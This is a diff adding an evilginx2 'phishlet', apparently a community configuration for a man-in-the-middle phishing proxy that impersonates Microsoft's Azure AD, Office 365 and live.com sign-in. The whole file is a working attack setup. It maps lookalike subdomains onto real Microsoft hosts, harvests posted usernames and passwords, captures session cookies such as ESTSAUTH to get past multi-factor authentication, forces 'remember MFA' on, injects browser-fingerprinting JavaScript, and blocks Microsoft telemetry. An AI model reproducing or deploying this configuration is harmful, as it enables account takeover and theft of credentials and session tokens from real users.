@@ -1,0 +1,129 @@
+name: 'microsoft-online'
+author: 'evilginx2 community (login.microsoftonline.com / Azure AD & O365 flow)'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login2', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn1', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn2', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn3', orig_sub: 'aadcdn', domain: 'msftauthimages.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn4', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'events', orig_sub: 'browser.events', domain: 'data.microsoft.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoft.com', orig_sub: 'login', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoft.com', orig_sub: 'login', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'browser.events.data.microsoft.com', orig_sub: 'browser.events', domain: 'data.microsoft.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'browser.events.data.microsoft.com', orig_sub: 'browser.events', domain: 'data.microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'ESTSAUTHTS', 'ESTSSC', 'SignInStateCookie', 'x-ms-gateway-slice', 'stsservicecookie', 'wlidperf', 'wlidprov', 'wlidxsrf', 'esctx', 'esctxPersistent', 'esctxLight', 'FedAuth', 'FedAuth1', 'PPAuth', 'MSAuth', '.*,regexp']
+  - domain: '.login.live.com'
+    keys: ['MSPOK', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', '.*,regexp']
+  - domain: '.live.com'
+    keys: ['.*,regexp']
+  - domain: '.login.live.com'
+    type: 'http'
+    path: '/'
+    name: 'bfp'
+    header: 'X-Bfp'
+auth_urls:
+  - '/'
+  - '/.*'
+  - '/common/.*'
+  - '/common/SAS/ProcessAuth'
+  - '/kmsi'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+js_inject:
+  - trigger_domains: ['login.live.com', 'login.microsoftonline.com']
+    trigger_paths: ['/.*']
+    script: |
+      (function () {
+        try {
+          var fp = {};
+          try {
+            var c = document.createElement('canvas');
+            var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+              var ext = gl.getExtension('WEBGL_debug_renderer_info');
+              fp.webgl = ext ? String(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)) : String(gl.getParameter(gl.RENDERER));
+            }
+          } catch (e) {}
+          try {
+            var o = new Date().getTimezoneOffset();
+            fp.timezone = String(Math.abs(o) / 60 * (o > 0 ? -1 : 1));
+            fp.timezoneName = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
+          } catch (e) {}
+          try { fp.platform = navigator.platform || null; } catch (e) {}
+          try { fp.language = navigator.language || null; } catch (e) {}
+          try { fp.languages = navigator.languages || null; } catch (e) {}
+          try { fp.deviceMemory = navigator.deviceMemory || null; } catch (e) {}
+          try { fp.hardwareConcurrency = navigator.hardwareConcurrency || null; } catch (e) {}
+          try { fp.webSocket = 'WebSocket' in window; } catch (e) {}
+          try { fp.serviceWorker = 'serviceWorker' in navigator; } catch (e) {}
+          try { fp.mediaSession = 'mediaSession' in navigator; } catch (e) {}
+          try { fp.battery = 'getBattery' in navigator; } catch (e) {}
+          try {
+            fp.plugins = [];
+            for (var i = 0; i < navigator.plugins.length; i++) {
+              fp.plugins.push(navigator.plugins[i].name);
+            }
+          } catch (e) {}
+          try {
+            var s = window.screen || {};
+            fp.screen = {
+              cWidth: String(s.width), sWidth: String(s.width),
+              cHeight: String(s.height), sHeight: String(s.height),
+              sAvailWidth: String(s.availWidth), sAvailHeight: String(s.availHeight),
+              sColorDepth: String(s.colorDepth), sPixelDepth: String(s.pixelDepth),
+              orientation: (s.orientation && s.orientation.type) || null,
+              wScreenX: '0', wScreenY: '0', wPageXOffset: '0', wPageYOffset: '0',
+              wInnerWidth: String(window.innerWidth), wOuterWidth: String(window.outerWidth),
+              wInnerHeight: String(window.innerHeight), wOuterHeight: String(window.outerHeight),
+              wDevicePixelRatio: String(window.devicePixelRatio || 1)
+            };
+          } catch (e) {}
+          var payload = btoa(unescape(encodeURIComponent(JSON.stringify(fp))));
+          fetch(window.location.origin + '/bfp', {
+            method: 'POST',
+            headers: { 'X-Bfp': payload, 'Content-Type': 'text/plain' },
+            body: '1'
+          }).catch(function () {});
+        } catch (e) {}
+      })();
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+intercept:
+  - {domain: 'browser.events.data.microsoft.com', path: '/.*', http_status: 403, body: '', mime: 'application/json'}
